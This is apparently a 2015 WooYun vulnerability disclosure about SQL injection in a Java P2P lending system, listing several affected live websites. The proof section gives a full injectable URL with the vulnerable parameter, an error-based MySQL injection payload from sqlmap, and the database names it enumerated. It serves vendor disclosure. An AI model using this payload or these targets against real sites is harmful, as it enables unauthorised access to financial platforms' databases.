wybug_corp: 山东金钱柜网络科技有限公司
wybug_detail:
漏洞详情 披露状态：   									2015-08-14：	细节已通知厂商并且等待厂商处理中									2015-08-15：	厂商已经确认，细节仅向厂商公开									2015-08-18：	细节向第三方安全合作伙伴开放									2015-10-09：	细节向核心白帽子及相关领域专家公开									2015-10-19：	细节向普通白帽子公开									2015-10-29：	细节向实习白帽子公开									2015-11-13：	细节向公众公开  简要描述： 来个20  Rank，上一个别忘了20 Rank啊 详细说明：  以前是金钱柜的php系统，现在发现java版本的p2p系统，瞅瞅，发现注入漏洞影响网站
部分网站，还有其他http://xinfuchuangtou.com/http://www.nuochencaifu.com/http://guangzecaifu.com/http://zhuangyuandai.com/http://junyuancaifu.com/http://yongxinct.com/http://minxinchuangtou.com/http://haotaiwangdai.com/http://lwgfjr.com/
   漏洞证明：  拿http://xinfuchuangtou.com/这个例子吧注入点：http://xinfuchuangtou.com/tender/tender/findlssuingBytender.action?currentPage=1&pageSize=10&returnWayId=1&moneyUseId=2&periodTimeId=1&periodDayId=0&award=2&money1=&money2=&satate=0returnWayId 存在注入
sqlmap identified the following injection points with a total of 496 HTTP(s) requests:---Place: GETParameter: returnWayId    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: currentPage=1&pageSize=10&returnWayId=1 AND (SELECT 1731 FROM(SELECT COUNT(*),CONCAT(0x7178746771,(SELECT (CASE WHEN (1731=1731) THEN 1 ELSE 0 END)),0x71686d6771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&moneyUseId=2&periodTimeId=1&periodDayId=0&award=2&money1=0&money2=9999&satate=0---back-end DBMS: MySQL 5.0sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: returnWayId    Type: error-based    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause    Payload: currentPage=1&pageSize=10&returnWayId=1 AND (SELECT 1731 FROM(SELECT COUNT(*),CONCAT(0x7178746771,(SELECT (CASE WHEN (1731=1731) THEN 1 ELSE 0 END)),0x71686d6771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)&moneyUseId=2&periodTimeId=1&periodDayId=0&award=2&money1=0&money2=9999&satate=0---back-end DBMS: MySQL 5.0available databases [4]:[*] information_schema[*] jqgp2p[*] mysql[*] performance_schema
不再进行下去了   修复方案：  java的程序员再加加班吧   版权声明：转载请注明来源 路人甲@乌云
